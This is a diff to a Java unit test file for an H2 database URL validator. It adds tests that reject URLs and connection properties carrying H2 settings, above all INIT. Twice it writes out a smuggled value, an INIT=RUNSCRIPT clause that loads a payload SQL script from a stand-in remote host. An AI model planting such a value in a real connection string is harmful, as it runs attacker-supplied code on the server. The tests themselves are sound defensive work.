@@ -36,7 +36,6 @@ public class H2DatabaseUrlsTest {
   public void test_database_name() {
     assertThat(H2DatabaseUrls.getDatabaseName("jdbc:h2:file:opal")).isEqualTo("opal");
     assertThat(H2DatabaseUrls.getDatabaseName("jdbc:h2:file:my-db_1.0")).isEqualTo("my-db_1.0");
-    assertThat(H2DatabaseUrls.getDatabaseName("jdbc:h2:file:opal;DB_CLOSE_DELAY=-1")).isEqualTo("opal");
   }
 
   @Test
@@ -48,7 +47,30 @@ public class H2DatabaseUrlsTest {
     assertRejected("jdbc:h2:file:sub\\opal");
     assertRejected("jdbc:h2:file:.opal");
     assertRejected("jdbc:h2:file:");
+  }
+
+  @Test
+  public void test_h2_settings_are_not_accepted() {
+    // a setting is not a tuning knob but a second language: INIT alone runs arbitrary SQL when the connection opens
+    assertRejected("jdbc:h2:file:opal;DB_CLOSE_DELAY=-1");
+    assertRejected("jdbc:h2:file:opal;INIT=RUNSCRIPT FROM 'https://elsewhere.example/payload.sql'");
     assertRejected("jdbc:h2:file:;DB_CLOSE_DELAY=-1");
+  }
+
+  @Test
+  public void test_init_connection_property_is_rejected() {
+    assertPropertiesRejected("INIT=RUNSCRIPT FROM 'https://elsewhere.example/payload.sql'");
+    assertPropertiesRejected("MODE=PostgreSQL;init=CREATE SCHEMA S");
+    assertPropertiesRejected(" Init = SELECT 1 ");
+  }
+
+  @Test
+  public void test_properties_without_an_init_setting_are_accepted() {
+    H2DatabaseUrls.validateProperties(null);
+    H2DatabaseUrls.validateProperties("");
+    H2DatabaseUrls.validateProperties("MODE=PostgreSQL;DB_CLOSE_DELAY=-1");
+    // a value that merely mentions the setting is not one
+    H2DatabaseUrls.validateProperties("MODE=INIT");
   }
 
   @Test
@@ -67,8 +89,6 @@ public class H2DatabaseUrlsTest {
     File root = temporaryFolder.newFolder("h2");
     assertThat(H2DatabaseUrls.expand("jdbc:h2:file:opal", root))
         .isEqualTo("jdbc:h2:file:" + new File(root, "opal").getAbsolutePath());
-    assertThat(H2DatabaseUrls.expand("jdbc:h2:file:opal;DB_CLOSE_DELAY=-1", root))
-        .isEqualTo("jdbc:h2:file:" + new File(root, "opal").getAbsolutePath() + ";DB_CLOSE_DELAY=-1");
   }
 
   @Test
@@ -97,6 +117,14 @@ public class H2DatabaseUrlsTest {
   @Test
   public void test_validate_accepts_a_new_database() throws IOException {
     H2DatabaseUrls.validate("jdbc:h2:file:opal", temporaryFolder.newFolder("h2"));
+  }
+
+  private void assertPropertiesRejected(String properties) {
+    try {
+      H2DatabaseUrls.validateProperties(properties);
+      fail("Expected an InvalidH2DatabaseException for properties: " + properties);
+    } catch(InvalidH2DatabaseException ignored) {
+    }
   }
 
   private void assertRejected(String url) {
